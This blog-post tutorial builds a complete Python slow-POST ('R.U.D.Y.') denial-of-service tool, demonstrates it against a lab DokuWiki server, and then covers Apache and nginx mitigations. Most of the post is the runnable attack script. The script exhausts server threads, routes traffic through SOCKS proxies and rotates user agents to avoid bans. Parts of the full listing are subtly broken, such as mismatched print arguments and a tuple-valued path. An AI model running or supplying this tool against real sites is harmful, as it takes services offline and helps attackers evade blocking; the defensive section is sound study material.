---
layout: post
title: Layer 7 Denial of Service - R.U.D.Y.
categories:
- python
- dos
- scripting
- network defense
---

#Intro to R.U.D.Y. attacks

![Mr. Robot]({{ site.baseurl }}images/rudy-post/mr-robot.jpg)

I'm a huge Mr. Robot fan. In one of the most memorable scenes of the pilot episode, Elliot is called in to work to stop what appears to be a massive DDoS attack against EvilCorp's servers. When it becomes clear that the attack is not a DDoS at all, and that he's dealing with a much more subtle threat from within EvilCorp's infrastructure, he exclaims excitedly "Is this a R.U.D.Y. attack? This is awesome!" 

<iframe width="420" height="315" src="https://www.youtube.com/embed/aNJXS9X0yY0" frameborder="0" allowfullscreen></iframe>

R.U.D.Y. attacks are actually a real thing, and are quite awesome indeed. They were first written about by __Hybrid Security__, who named their proof of concept __r-u-dead-yet__ after the song by Children of Bodom. R.U.D.Y is an application layer attack. This means that unlike volume or protocol based attacks, the goal of a R.U.D.Y. is to use seemingly legitimate HTTP traffic to crash the target web server.

R.U.D.Y. is what is known as a Slow POST DoS attack. Slow POSTs work by sending a legitimate HTTP header to the target server, then sending the HTTP body slowly enough to consume an entire thread on the target for an extended period of time. R.U.D.Y. attacks do this by setting the Content-Length field in the HTTP header to an extremely high value, then sending the POST data one byte at a time while the target server waits for the entire request to complete. 

In this post we will build a tool for launching R.U.D.Y. attacks, in direct homage of the original __r-u-dead-yet__ script, taking a close look at the core logic that makes them so effective. We will then run our tool against an actual target so we can see a R.U.D.Y. attack in action. We will then go over effective mitigation techniques that can be used to protect against these types of attacks.

# Building RU-DEAD-YET - Initial Setup

Let's first create a new project directory called __rudydos__, along with a new virtualenv within it:

{% highlight bash %}

# create project directory
mkdir rudydos	

# change into project directory and create new virtual environment
cd rudydos
virtualenv --no-site-packages env

{% endhighlight %}

Let's then activate our virtual environment:

{% highlight bash %}

. env/bin/activate

{% endhighlight %}

Next we create two new files - pip.req and run.py:

{% highlight bash %}

touch pip.req run.py

{% endhighlight %}

We then open up our pip.req file and add these lines to enumerate dependencies:

	requests
	requesocks
	beautifulsoup4
	SocksiPy

Finally, we use pip to install all of the dependencies we just listed in our pip.req file:

{% highlight bash %}

pip install -r pip.req

{% endhighlight %}

# Building RU-DEAD-YET - Core Logic

{% highlight python %}
def craft_headers(path, host, user_agent, param, cookies):

    return '\n'.join([

        'POST %s HTTP/1.1' % path,
        'Host: %s' % host,
        'Connection: keep-alive',
        'Content-Length: 100000000',
        'User-Agent: %s' % user_agent,
        'cookies',
        '%s=' % param, 
    ])
{% endhighlight %}

Let's open up run.py. The first thing we want to do is create a function to craft the special HTTP headers we'll be using for this attack. Notice how the Content-Length field is ridiculously long. This is super long Content-Length is one of the keys to getting this DOS attack to work. We also send the start of our POST parameter, but without sending any actual content.


{% highlight python %}
def launch_attack(cid, configs, headers):

    try:

        # establish initial connection to target
        print '[worker %d] Establishing connection' % cid

        # if we're using proxies, then we use socksocket() instead of socket()
        if 'proxies' in configs:

            # select proxy
            proxy = random.choice(configs['proxies'])
            print '[worker %d] Using socks proxy %s:%d' % (cid, proxy['address'], proxy['port'])

            # connect through proxy
            sock = socksocket()
            sock.setproxy(PROXY_TYPE_SOCK4, proxy['address'], proxy['port'])

        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((configs['host'], configs['port']))

        print '[worker %d] Successfully connected to %s' % (cid, configs['target'])

        # start dos attack by sending request headers
        print '[worker %d] Beginning HTTP session... sending headers' % cid
        sock.send(headers)
		
		# send request body very slowly
        while True:
            print '[worker %d] Sending one byte to target.' % cid
            sock.send("\x41")
            print '[worker %d] Sleeping for %d seconds' % (cid, configs['sleep_time'])
            time.sleep(configs['sleep_time'])
    except KeyboardInterrupt:
        pass
    sock.close() 
{% endhighlight %}

Our launch\_attack() function takes three arguments - cid, configs, and headers. The cid (connection id) argument is an id number for the process that we set in the calling function. We use it to identify what process we are currently in as we are printing output to the terminal. The second parameter, configs, is a dict containing the target host, target port, sleep time, and possibly proxy information if proxies are currently enabled. The third  parameter contains the specially crafted HTTP headers we made using craft\_headers().

The first thing our function does is establish a TCP connection to our target. It then sends the HTTP request headers to the target, with content-length set to one million bytes. It then begins to send the HTTP body one byte at a time, pausing for configs['sleep_time'] seconds between each byte.

	1,000,000 bytes x 10 seconds / 60 / 60 / 24 / 30 == approx 3.8 months

To illustrate just how slow this is, suppose configs['sleep_time'] is set to 10 seconds. Then with content-length set to 1 million, it will take nearly 4 months for the request to complete. This effectively means that we have rendered one of the target server's worker threads completely useless. If we run this function as its own process (which we will) multiple times in parallel, we can easily tie up every worker thread the target server has, causing a denial of service. 

We throw the whole thing in try-catch block so that we can exit cleanly on user interrupt.

{% highlight python %}
if __name__ == '__main__':

    # set things up
    configs = configure()
    connections = []

    try:

        # spawn connections child processes to make connections
        for i in xrange(configs['connections']):

            # craft header with random user agent for each connection
            headers = craft_headers(configs['path'],
                                configs['host'],
                                random.choice(configs['user_agents']),
                                configs['param'],
                                configs['cookies'])

            # launch attack as child process
            p = Process(target=launch_attack, args=(i, configs, headers))
            p.start()
            connections.append(p)

        # wait for all processes to finish or user interrupt
        for c in connections:
            c.join()

    except KeyboardInterrupt:

        # terminate all connections on user interrupt
        print '\n[!] Exiting on User Interrupt'
        for c in connections:
            c.terminate()
        for c in connections:
            c.join()
{% endhighlight %}

The first thing that we're going to do in our driver code is create a config dictionary using configure(). Our configs dictionary will contain the following 8 items that will be used in our driver code:

- __configs['connections']__ - How many simultaneous connections to make to the target.

- __configs['path']__ - The relative path of the target url. We need this information in order to craft HTTP headers from scratch.

- __configs['host']__ - The domain name of the target URL. Once again, we'll be using this information to create valid HTTP headers to send to the target.

- __configs['port']__ - The port at which to send our HTTP requests.

- __configs['target']__ - The URL to which we will be making our slow POST requests. This is obtained by scraping the target URL provided by the user for html forms, then parsing the form's 'action' attribute.

- __configs['cookies']__ - Any cookies required by the target server. We obtain these in the configure() function by making a GET request to the target server, then checking the response headers for the 'Set-Cookie' field.

- __configs['param']__ - We will need a valid POST parameter in which to send our data. As we did with our 'target' config, configure() obtains this information by scraping the target for html forms, extracting an html input tag, then parsing the input tag's 'name' parameter.

- __configs['user_agents']__ - A list of user agents for use in our http headers. We'll be setting a different user agent per connection to make our script harder to ban.


Once we've created our configs dictionary using configure(), we start spawning child processes to run the launch_attack() function. Each child process gets a unique HTTP header with a randomly selected user agent. Once we have launched all of our child processes, we wait for them to finish running and join with their parent process. Since this will probably take a really long time to happen, we throw the whole block of code in a try-catch block so that the user can cleanly terminate the script by pressing ctrl+c.

# Building RU-DEAD-YET - Everything Else

The rest of the code in the script is dedicated to parsing command line arguments and setting configurations. I'm omitting a detailed explanation about how this portion of the script works for the sake of brevity. With that said, feel free to email me if you have any questions about how the script's setup code works.

Our completed RUDY script should look like this:

{% highlight python %} 

#!/usr/bin/env python

import requests
import requesocks
import socket
import sys
import re
import random
import time

from bs4 import BeautifulSoup
from socks import socksocket
from urlparse import urlparse
from multiprocessing import Process
from argparse import ArgumentParser

MAX_CONNECTIONS      = 50
SLEEP_TIME           = 10
PROXY_ADDRESS        = '127.0.0.1'
PROXY_PORT           = 9050
DEFAULT_USER_AGENT   = '%s' %\
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'

def form_to_dict(form):
    
    form_dict = {
        'action' : form.get('action', ''),
        'method' : form.get('method', 'post'),
        'id' : form.get('id', ''),
        'class' : form.get('class', ''),
        'inputs' : [],
    }
    
    for index, input_field in enumerate(form.findAll('input')):

        form_dict['inputs'].append({
            'id' : input_field.get('id', ''),
            'class' : input_field.get('class', ''),
            'name' : input_field.get('name', ''),
            'value' : input_field.get('value', ''),
            'type' : input_field.get('type', ''),
        })
    return form_dict

def get_forms(response):
    
    soup = BeautifulSoup(response.text)

    forms = []
    for form in soup.findAll('form'):
        
        forms.append(form_to_dict(form))

    return forms

def print_forms(forms):

    for index,form in enumerate(forms):
        print 'Form #%d --> id: %s --> class: %s --> action: %s' %\
                (index, form['id'], form['class'], form['action'])

def print_inputs(inputs):

    for index, input_field in enumerate(inputs):
        print 'Input #%d: %s' %\
            (index, input_field['name'])

def choose_form(response):
    forms = get_forms(response)

    return make_choice(print_forms,
                'Please select a form from the list above.',
                forms,
                'form')

def choose_input(form):

    return make_choice(print_inputs,
                    'Please select a form field from the list above.',
                    form['inputs'],
                    'input')

def make_choice(menu_function, prompt, choices, field):

    while True:
        try:
            menu_function(choices)
            index = int(raw_input('Enter %s number: ' % field))
            return choices[index]
        except IndexError:
            print 'That is not a valid choice.'
        except ValueError:
            print 'That is not a valid choice.'
        print

def craft_headers(path, host, user_agent, param, cookies):

    return '\n'.join([

        'POST %s HTTP/1.1' % path,
        'Host: %s' % host,
        'Connection: keep-alive',
        'Content-Length: 100000000',
        'User-Agent: %s' % user_agent,
        'cookies',
        '%s=' % param, 
    ])

def host_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    return m.group('host')

def port_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    port = m.group('port')
    if port == '':
        return 80
    return int(port)

def select_session(configs):

    if 'proxies' in configs:
        session = requesocks.session()
        proxy = configs['proxies'][0]
        session.proxies = {
                'http': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
                'https': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
        }
    else:
        session = requests.session()

    return session


def parse_args():

    parser = ArgumentParser()

    parser.add_argument('--target',
                    dest='target',
                    type=str,
                    required=True,
                    help='Target url')

    parser.add_argument('--connections',
                    dest='connections',
                    type=int,
                    required=False,
                    default=MAX_CONNECTIONS,
                    help='The number of connections to run simultaneously (default 50)')
    
    parser.add_argument('--user-agents',
                    dest='user_agent_file',
                    type=str,
                    required=False,
                    help='Load user agents from file')

    parser.add_argument('--proxies',
                    dest='proxy_file',
                    type=str,
                    nargs='*',
                    required=False,
                    help='Load user agents from file')
    
    parser.add_argument('--sleep',
                    dest='sleep_time',
                    type=int,
                    required=False,
                    metavar='<seconds>',
                    default=SLEEP_TIME,
                    help='Wait <seconds> seconds before sending each byte.')

    return parser.parse_args()
    
def configure():

    args = parse_args()
    configs = {}

    if args.proxy_file is not None:
        if args.proxy_file == []:
            configs['proxies'] = [{
                        'address' : PROXY_ADDRESS,
                        'port' : PROXY_PORT,
            }]
        else:
            with open(args.proxy_file) as fd:
                configs['proxies'] = []
                for line in fd:
                    proxy = line.split()
                    configs['proxies'].append({
                        'address' : proxy[0],
                        'port' : proxy[1],
                    })

    configs['user_agents'] = [DEFAULT_USER_AGENT]
    if args.user_agent_file is not None:
        with open(args.user_agent_file) as fd:
            configs['user_agents'] += fd.read().split('\n')

    # select form and target POST parameter, and set cookies 
    session = select_session(configs)
    response = session.get(args.target)
    form = choose_form(response)
    configs['param'] = choose_input(form)['name']
    configs['cookies'] = response.headers.get('set-cookie', '')

    # select target URL using selected form
    parsed_url = urlparse(args.target)
    if form['action'] != '':
        if form['action'].startswith('/'):
            configs['target'] = 'http://%s%s' % (parsed_url.netloc, form['action'])
    else:
        configs['target'] = args.target

    # set path, HTTP host and port 
    configs['path'] = parsed_url.path,
    configs['host'] = host_from_url(configs['target'])
    configs['port'] = port_from_url(configs['target'])

    # set connections and sleep_time
    configs['connections'] = args.connections
    configs['sleep_time'] = args.sleep_time

    return configs

def launch_attack(i, configs, headers):

    try:

        # establish initial connection to target
        print '[worker %d] Establishing connection'

        # if we're using proxies, then we use socksocket() instead of socket()
        if 'proxies' in configs:

            # select proxy
            proxy = random.choice(configs['proxies'])
            print '[worker %d] Using socks proxy %s:%d' % (proxy['address'], proxy['port'])

            # connect through proxy
            sock = socksocket()
            sock.setproxy(PROXY_TYPE_SOCK4, proxy['address'], proxy['port'])

        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((configs['host'], configs['port']))

        print '[worker %d] Successfully connected to %s' % (i, configs['target'])

        # start dos attack
        print '[worker %d] Beginning HTTP session... sending headers' % i
        sock.send(headers)
        while True:
            print '[worker %d] Sending one byte to target.' % i
            sock.send("\x41")
            print '[worker %d] Sleeping for %d seconds' % (i, configs['sleep_time'])
            time.sleep(configs['sleep_time'])
    except KeyboardInterrupt:
        pass
    sock.close() 

if __name__ == '__main__':

    print '''

        
                       ...
                     ;::::;
                   ;::::; :;
                 ;:::::'   :;
                ;:::::;     ;.
               ,:::::'       ;           OOO\\
               ::::::;       ;          OOOOO\\
               ;:::::;       ;         OOOOOOOO
              ,;::::::;     ;'         / OOOOOOO
            ;:::::::::`. ,,,;.        /  / DOOOOOO
          .';:::::::::::::::::;,     /  /     DOOOO
         ,::::::;::::::;;;;::::;,   /  /        DOOO
        ;`::::::`'::::::;;;::::: ,#/  /          DOOO
        :`:::::::`;::::::;;::: ;::#  /            DOOO
        ::`:::::::`;:::::::: ;::::# /              DOO
        `:`:::::::`;:::::: ;::::::#/               DOO
         :::`:::::::`;; ;:::::::::##                OO
         ::::`:::::::`;::::::::;:::#                OO
         `:::::`::::::::::::;'`:;::#                O
          `:::::`::::::::;' /  / `:#
           ::::::`:::::;'  /  /   `#


            RU-DEAD-YET
				.: Written by s0lst1c3
				.: Inspired by the original by Hybrid Security

'''

    # set things up
    configs = configure()
    connections = []

    try:

        # spawn child processes to make connections
        for i in xrange(configs['connections']):

            # craft header with random user agent for each connection
            headers = craft_headers(configs['path'],
                                configs['host'],
                                random.choice(configs['user_agents']),
                                configs['param'],
                                configs['cookies'])

            # launch attack as child process
            p = Process(target=launch_attack, args=(i, configs, headers))
            p.start()
            connections.append(p)

        # wait for all processes to finish or user interrupt
        for c in connections:
            c.join()

    except KeyboardInterrupt:

        # terminate all connections on user interrupt
        print '\n[!] Exiting on User Interrupt'
        for c in connections:
            c.terminate()
        for c in connections:
            c.join()

{% endhighlight %} 

#R.U.D.Y. attack demo

Now let's see our script in action. For this demo I'm going to be running our script against a DokuWiki installation served by Apache2 on Ubuntu Server. Note that I'm running this on a lab network that I have full permission to attack. Be very careful running these kind of tests on networks and servers that you do not have full control over. Attacking your own site on a shared network or server could possibly be a TOS violation or illegal.

![Target info]({{ site.baseurl }}images/rudy-post/target-info.png)

The first thing we're going to do is start the script using the following command:

{% highlight bash %}
	./run.py --connections 500 --target http://192.168.99.102/doku.php
{% endhighlight %}


This will launch our script against the DokuWiki instance at 192.168.99.102/doku.php with 500 concurrent connections. The script will then prompt us to select a form from the target web page. In the screenshot below, I select "Form #2" to select the Login Form.

![Choose form]({{ site.baseurl }}images/rudy-post/choose-form.png)

The script then prompts us to select one of the input tags from "Form #2" to use as a POST parameter. In the screenshot below, I select the third option, which corresponds to the username field in the login form.

![Choose param]({{ site.baseurl }}images/rudy-post/choose-param.png)

Once we select a form and POST parameter to attack, our script will start spawning connections to the target server. The whole attack is shown in the video below. Notice how the web server completely grinds to a halt when our script starts running.

<iframe width="560" height="315" src="https://www.youtube.com/embed/HxnEFihK9o4" frameborder="0" allowfullscreen></iframe>

#Effective Countermeasures

R.U.D.Y. is not an unstoppable DoS, and there are multiple ways of mitigating this kind of attack. An article by Trustwave, which can be found [here](https://www.trustwave.com/Resources/SpiderLabs-Blog/(Updated)-ModSecurity-Advanced-Topic-of-the-Week--Mitigating-Slow-HTTP-DoS-Attacks/), outlines how to combine the mod-security and reqtimeout Apache modules as countermeasures to Slow POST attacks. Trustwave's countermeasures work by using reqtimeout to drop HTTP requests that take longer than 30 seconds to complete, and using mod-security to ban IPs that rack up more than 5 of these timeouts per minute.

Most recent versions of Apache ship with reqtimeout already installed, but you can verify that it is currently enabled like this:

![ReqTimeout]({{ site.baseurl }}images/rudy-post/show-reqtimeout.png)

Once we've made sure that reqtimeout is enabled, we want to open up our reqtimeout.conf file and add the directive shown on line 28 in the image below.

![ReadTimeout conf]({{ site.baseurl }}images/rudy-post/read-timeout-conf.png)

The 'RequestReadTimeout header=30 body=30' directive tells Apache to wait a maximum of 30 seconds for both the request headers and body. Apache will send a 408 response code if this timeout occurs.

Next we want to install and enable mod-security.

![install mod security]({{ site.baseurl }}images/rudy-post/install-mod-security.png)

We then want to open up our mod-security.conf file and add the directives on lines 11 through 21 in the image below.

![mod-security conf]({{ site.baseurl }}images/rudy-post/mod-security-conf.png)

The mod-security plugin is just a Web Application Firewall (WAF), and the 'SecRuleEngine On' directive tells Apache that it's ok for us to write our own rules for it. Fun fact - mod-security ships with no rules enabled by default. If you think that you're magically protecting your server by simply installing mod-security and calling it a day, think again. You still have to configure it.


We then add Trustwave's mod-security directives, which are shown on lines 17 through 20 in the image above. Trustwave's mod-security rules tell Apache to keep track of how many 408 errors are issued per IP address per minute, and to ban IP addresses that exceed five 408's per minute.

Finally, we restart Apache so that our changes take effect:

{% highlight bash %}
	service apache2 restart
{% endhighlight %}

The next video shows Trustwave's R.U.D.Y. mitigation in action as we try to run our script against the target and ultimately fail.

<iframe width="560" height="315" src="https://www.youtube.com/embed/Oe_gLNJaFPU" frameborder="0" allowfullscreen></iframe>

As you can see, it's not a perfect solution. The R.U.D.Y script was able to keep the target server out of commission for well over a minute before it was banned by mod-security. That kind of downtime could very well lead to a significant loss of revenue on a production system. It would not be much of stretch to modify our script to relaunch connections through fresh SOCKS proxies each time a connection gets banned.

Non-blocking servers seem to be the best defense against these kinds of attacks. Check out what happens when we try to DOS the DokuWiki with our R.U.D.Y. script, but this time with NGninx runnig as the web server instead of Apache.

<iframe width="560" height="315" src="https://www.youtube.com/embed/AfzhRxtNapg" frameborder="0" allowfullscreen></iframe>

Even though we launched 500 slow POST connections against the target server, NGinx happily kept serving the web page. This is because NGinx serves content asynchronously, so incomplete requests are simply moved to the background while NGinx's event loop keeps working on other things.

So what's the verdict? R.U.D.Y. attacks are really hard to mitigate, unless you're using an event driven web server. Which you should be, because it's nearly 2016. >:)


### Bibliography
- [Trustwave - Mitigating Slow HTTP DoS Attacks](https://www.trustwave.com/Resources/SpiderLabs-Blog/(Updated)-ModSecurity-Advanced-Topic-of-the-Week--Mitigating-Slow-HTTP-DoS-Attacks/) 

- [Hybrid Security - r-u-dead-yet](https://code.google.com/p/r-u-dead-yet/)

- [Incapsula - DDoS Attack Glossary](https://www.incapsula.com/ddos/attack-glossary/rudy-r-u-dead-yet.html)

- [Radware - DDoSPedia](http://security.radware.com/knowledge-center/DDoSPedia/rudy-r-u-dead-yet/)

- [David Senecai - Slow DoS on the Rise](https://blogs.akamai.com/2013/09/slow-dos-on-the-rise.html)

- [Sergey Shekyan - How to Protect Against Slow HTTP Attacks](https://community.qualys.com/blogs/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks)




